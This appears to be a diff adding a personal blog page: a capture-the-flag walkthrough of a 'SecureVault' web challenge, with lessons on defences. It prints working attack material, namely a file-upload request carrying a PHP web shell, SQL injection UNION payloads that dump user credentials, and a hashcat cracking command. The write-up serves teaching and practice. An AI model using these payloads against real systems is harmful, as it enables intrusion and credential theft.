@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Walkthrough: How I Solved the HackerOne CTF Challenge | Lucifer's Cybersecurity Blog</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link rel="stylesheet" href="assets/css/style.css">
+    <link rel="icon" type="image/png" href="assets/images/favicon.png">
+</head>
+<body>
+    <div class="matrix-bg">
+        <canvas id="matrix"></canvas>
+    </div>
+    
+    <div class="container">
+        <div class="terminal-header">
+            <div class="terminal-controls">
+                <div class="control close"></div>
+                <div class="control minimize"></div>
+                <div class="control maximize"></div>
+            </div>
+            <div class="terminal-title">lucifer@kali:~/blog/ctf-challenge</div>
+            <div class="term-clock">
+                <div class="menu-numbers">
+                    <a href="index.html">[0] Home</a>
+                    <a href="about.html">[1] About</a>
+                    <a href="blog.html" class="active">[2] Blog</a>
+                    <a href="portfolio.html">[3] Portfolio</a>
+                    <a href="contact.html">[4] Contact</a>
+                </div>
+                <div class="clock-item">
+                    <i class="far fa-clock"></i>
+                    <span id="system-time">15:57:18</span>
+                </div>
+            </div>
+        </div>
+        
+        <main class="hero">
+            <div class="system-message">[SYSTEM]: Loading article content... Access granted.</div>
+            
+            <div class="article-container">
+                <div class="article-header">
+                    <h1 class="article-title">Walkthrough: How I Solved the HackerOne CTF Challenge</h1>
+                    <div class="article-meta">
+                        <span class="article-date"><i class="far fa-calendar-alt"></i> April 10, 2025</span>
+                        <span class="article-author"><i class="far fa-user"></i> Lucifer</span>
+                        <span class="article-category"><i class="fas fa-tag"></i> CTF Writeups</span>
+                    </div>
+                    <div class="article-image">
+                        <img src="https://cdn.pixabay.com/photo/2017/02/09/13/09/cyber-security-2051362_1280.jpg" alt="HackerOne CTF Challenge">
+                    </div>
+                </div>
+                
+                <div class="article-content">
+                    <h2>Introduction</h2>
+                    <p>
+                        Last month, HackerOne hosted a challenging CTF competition focused on web security vulnerabilities. The competition consisted of multiple challenges with increasing difficulty levels. In this blog post, I'll walk through my methodology for solving one of the most challenging problems: "SecureVault" - a simulated secure file storage application with multiple vulnerabilities.
+                    </p>
+                    
+                    <h2>Challenge Overview</h2>
+                    <p>
+                        The SecureVault challenge presented participants with a web application that allowed users to upload, store, and manage sensitive files. The goal was to gain admin access and retrieve a hidden flag file. The application had the following components:
+                    </p>
+                    
+                    <ul>
+                        <li>User registration and authentication system</li>
+                        <li>File upload functionality with validation</li>
+                        <li>User profile management</li>
+                        <li>Admin dashboard (restricted access)</li>
+                    </ul>
+                    
+                    <h2>Initial Reconnaissance</h2>
+                    <p>
+                        As with any CTF challenge, I began with thorough reconnaissance. I mapped out the application's functionality, identified technologies used, and looked for potential entry points.
+                    </p>
+                    
+                    <div class="code-block">
+                        <code>
+$ nmap -sV -p- 10.10.10.x<br>
+Starting Nmap 7.93 ( https://nmap.org ) at 2025-04-05 14:22 EDT<br>
+Nmap scan report for securevault.ctf.hackerone.com (10.10.10.x)<br>
+Host is up (0.074s latency).<br>
+Not shown: 65532 closed ports<br>
+PORT     STATE SERVICE VERSION<br>
+22/tcp   open  ssh     OpenSSH 8.4p1<br>
+80/tcp   open  http    Apache httpd 2.4.54<br>
+3306/tcp open  mysql   MySQL 8.0.30
+                        </code>
+                    </div>
+                    
+                    <p>
+                        Next, I explored the web application, creating a test account and mapping all functionalities. I noticed the application was running a PHP backend with MySQL database.
+                    </p>
+                    
+                    <h2>Vulnerability #1: Insecure File Upload</h2>
+                    <p>
+                        The file upload functionality seemed well-protected at first glance. It checked file extensions and appeared to validate MIME types. However, after some testing, I discovered the validation could be bypassed by manipulating the content-type header during upload.
+                    </p>
+                    
+                    <div class="code-block">
+                        <code>
+POST /upload.php HTTP/1.1<br>
+Host: securevault.ctf.hackerone.com<br>
+Content-Length: 1337<br>
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryABC123<br>
+...<br>
+------WebKitFormBoundaryABC123<br>
+Content-Disposition: form-data; name="file"; filename="profile.jpg.php"<br>
+Content-Type: image/jpeg<br>
+<br>
+GIF89a;<?php system($_GET['cmd']); ?><br>
+------WebKitFormBoundaryABC123--
+                        </code>
+                    </div>
+                    
+                    <p>
+                        This allowed me to upload a web shell disguised as an image file. The server was configured to execute PHP files even with double extensions.
+                    </p>
+                    
+                    <h2>Vulnerability #2: Broken Access Control</h2>
+                    <p>
+                        While exploring the application, I noticed the user profile page had a parameter that looked suspicious:
+                    </p>
+                    
+                    <div class="code-block">
+                        <code>
+https://securevault.ctf.hackerone.com/profile.php?id=123
+                        </code>
+                    </div>
+                    
+                    <p>
+                        By manipulating the id parameter, I could access other users' profiles. This indicated an IDOR (Insecure Direct Object Reference) vulnerability. Through incremental testing, I discovered the admin user had an ID of 1.
+                    </p>
+                    
+                    <h2>Vulnerability #3: SQL Injection</h2>
+                    <p>
+                        While examining the search functionality, I discovered a potential SQL injection point. The search parameter wasn't properly sanitized, allowing for SQL injection attacks.
+                    </p>
+                    
+                    <div class="code-block">
+                        <code>
+https://securevault.ctf.hackerone.com/search.php?q=test' UNION SELECT 1,2,3,4,5,6,7,8,9,10-- -
+                        </code>
+                    </div>
+                    
+                    <p>
+                        I exploited this vulnerability to extract database information:
+                    </p>
+                    
+                    <div class="code-block">
+                        <code>
+https://securevault.ctf.hackerone.com/search.php?q=test' UNION SELECT 1,2,3,4,5,6,7,8,9,concat(username,':',password) FROM users-- -
+                        </code>
+                    </div>
+                    
+                    <p>
+                        This query revealed hashed passwords for all users, including the admin user.
+                    </p>
+                    
+                    <h2>Cracking the Admin Password</h2>
+                    <p>
+                        The admin's password hash was MD5 (a weak hashing algorithm). I used Hashcat to crack it:
+                    </p>
+                    
+                    <div class="code-block">
+                        <code>
+$ hashcat -m 0 -a 0 5f4dcc3b5aa765d61d8327deb882cf99 /usr/share/wordlists/rockyou.txt<br>
+5f4dcc3b5aa765d61d8327deb882cf99:password123
+                        </code>
+                    </div>
+                    
+                    <p>
+                        With the admin credentials in hand, I could now log in to the admin dashboard.
+                    </p>
+                    
+                    <h2>Capturing the Flag</h2>
+                    <p>
+                        After logging in as admin, I discovered a section called "System Configuration" that included a file management tool. This tool allowed for browsing server files, including those outside the web root directory.
+                    </p>
+                    
+                    <p>
+                        I navigated to the root directory and found a hidden folder named ".flags" which contained the final flag file:
+                    </p>
+                    
+                    <div class="code-block">
+                        <code>
+$ cat /home/www/.flags/final_flag.txt<br>
+H1-CTF{c0ngr4ts_y0u_pwn3d_th3_v4ult_l1k3_4_pr0}
+                        </code>
+                    </div>
+                    
+                    <h2>Lessons Learned</h2>
+                    <p>
+                        This CTF challenge highlighted several common but critical web security vulnerabilities:
+                    </p>
+                    
+                    <ol>
+                        <li><strong>Improper File Upload Validation:</strong> Never trust client-side validation; implement thorough server-side validation for file uploads.</li>
+                        <li><strong>Broken Access Control:</strong> Always implement proper authorization checks for every user action.</li>
+                        <li><strong>SQL Injection:</strong> Use parameterized queries or prepared statements to prevent SQL injection.</li>
+                        <li><strong>Weak Password Hashing:</strong> Use strong hashing algorithms with proper salting (bcrypt, Argon2) instead of MD5.</li>
+                        <li><strong>Path Traversal:</strong> Implement proper input sanitization and restrict file system access.</li>
+                    </ol>
+                    
+                    <h2>Conclusion</h2>
+                    <p>
+                        The HackerOne CTF challenge was an excellent opportunity to practice real-world penetration testing skills in a controlled environment. By methodically identifying and exploiting vulnerabilities in the SecureVault application, I was able to successfully capture the flag.
+                    </p>
+                    
+                    <p>
+                        Remember, the techniques described in this writeup should only be used in authorized testing environments or CTF competitions. Always practice ethical hacking and obtain proper permission before testing any system.
+                    </p>
+                    
+                    <div class="share-buttons">
+                        <span>Share this article:</span>
+                        <a href="#" class="share-btn"><i class="fab fa-twitter"></i></a>
+                        <a href="#" class="share-btn"><i class="fab fa-facebook-f"></i></a>
+                        <a href="#" class="share-btn"><i class="fab fa-linkedin-in"></i></a>
+                        <a href="#" class="share-btn"><i class="fab fa-reddit-alien"></i></a>
+                    </div>
+                    
+                    <div class="article-tags">
+                        <span>Tags:</span>
+                        <a href="#" class="tag">CTF</a>
+                        <a href="#" class="tag">Web Security</a>
+                        <a href="#" class="tag">Penetration Testing</a>
+                        <a href="#" class="tag">HackerOne</a>
+                        <a href="#" class="tag">Walkthrough</a>
+                    </div>
+                    
+                    <div class="article-navigation">
+                        <a href="sql-injection-article.html" class="prev-article">
+                            <i class="fas fa-arrow-left"></i> Previous Article
+                        </a>
+                        <a href="blog.html" class="back-to-blog">
+                            <i class="fas fa-th-large"></i> Back to Blog
+                        </a>
+                        <a href="burpsuite-article.html" class="next-article">
+                            Next Article <i class="fas fa-arrow-right"></i>
+                        </a>
+                    </div>
+                    
+                    <div class="comments-section">
+                        <h3>Comments (4)</h3>
+                        
+                        <div class="comment">
+                            <div class="comment-avatar">
+                                <img src="assets/images/avatars/avatar1.jpg" alt="User Avatar">
+                            </div>
+                            <div class="comment-content">
+                                <div class="comment-header">
+                                    <span class="comment-author">JohnDoe</span>
+                                    <span class="comment-date">April 11, 2025</span>
+                                </div>
+                                <p class="comment-text">
+                                    Great writeup! I was stuck on the file upload bypass. Your explanation helped me understand where I went wrong.
+                                </p>
+                                <div class="comment-actions">
+                                    <a href="#" class="comment-reply">Reply</a>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="comment">
+                            <div class="comment-avatar">
+                                <img src="assets/images/avatars/avatar2.jpg" alt="User Avatar">
+                            </div>
+                            <div class="comment-content">
+                                <div class="comment-header">
+                                    <span class="comment-author">HackerAlice</span>
+                                    <span class="comment-date">April 12, 2025</span>
+                                </div>
+                                <p class="comment-text">
+                                    I solved it differently! Instead of SQLi, I found an XXE vulnerability in the XML parser that they were using for import/export functionality. It allowed me to read the admin creds directly.
+                                </p>
+                                <div class="comment-actions">
+                                    <a href="#" class="comment-reply">Reply</a>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="comment">
+                            <div class="comment-avatar">
+                                <img src="assets/images/avatars/avatar3.jpg" alt="User Avatar">
+                            </div>
+                            <div class="comment-content">
+                                <div class="comment-header">
+                                    <span class="comment-author">SecurityPro</span>
+                                    <span class="comment-date">April 14, 2025</span>
+                                </div>
+                                <p class="comment-text">
+                                    Did anyone notice that you could also pivot to the internal network after getting RCE? There was another flag on the database server!
+                                </p>
+                                <div class="comment-actions">
+                                    <a href="#" class="comment-reply">Reply</a>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="comment">
+                            <div class="comment-avatar">
+                                <img src="assets/images/avatars/avatar4.jpg" alt="User Avatar">
+                            </div>
+                            <div class="comment-content">
+                                <div class="comment-header">
+                                    <span class="comment-author">Newbie_Hacker</span>
+                                    <span class="comment-date">April 15, 2025</span>
+                                </div>
+                                <p class="comment-text">
+                                    This was way too difficult for me, but I learned a lot from your writeup. Could you explain more about the MIME type bypass technique?
+                                </p>
+                                <div class="comment-actions">
+                                    <a href="#" class="comment-reply">Reply</a>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="add-comment">
+                            <h4>Add a Comment</h4>
+                            <form class="comment-form">
+                                <div class="form-group">
+                                    <input type="text" placeholder="Name" required>
+                                </div>
+                                <div class="form-group">
+                                    <input type="email" placeholder="Email" required>
+                                </div>
+                                <div class="form-group">
+                                    <textarea placeholder="Your comment" required></textarea>
+                                </div>
+                                <button type="submit" class="submit-btn">Post Comment</button>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <footer>
+            <div class="social-icons">
+                <a href="https://github.com/indianhacker12" class="social-icon" target="_blank" rel="noopener noreferrer"><i class="fab fa-github"></i></a>
+                <a href="https://x.com/YaswantP86897" class="social-icon" target="_blank" rel="noopener noreferrer"><i class="fab fa-twitter"></i></a>
+                <a href="https://www.linkedin.com/in/yaswantpandey" class="social-icon" target="_blank" rel="noopener noreferrer"><i class="fab fa-linkedin"></i></a>
+                <a href="https://www.instagram.com/" class="social-icon" target="_blank" rel="noopener noreferrer"><i class="fab fa-instagram"></i></a>
+            </div>
+            <p>&copy; 2025 Lucifer. All rights reserved.</p>
+        </footer>
+    </div>
+
+    <script src="assets/js/matrix.js"></script>
+    <script src="assets/js/main.js"></script>
+    <script>
+        // Live clock
+        function updateClock() {
+            const now = new Date();
+            let hours = now.getHours();
+            let minutes = now.getMinutes();
+            let seconds = now.getSeconds();
+            
+            hours = hours < 10 ? '0' + hours : hours;
+            minutes = minutes < 10 ? '0' + minutes : minutes;
+            seconds = seconds < 10 ? '0' + seconds : seconds;
+            
+            document.getElementById('system-time').textContent = `${hours}:${minutes}:${seconds}`;
+            setTimeout(updateClock, 1000);
+        }
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            updateClock();
+        });
+    </script>
+</body>
+</html> 
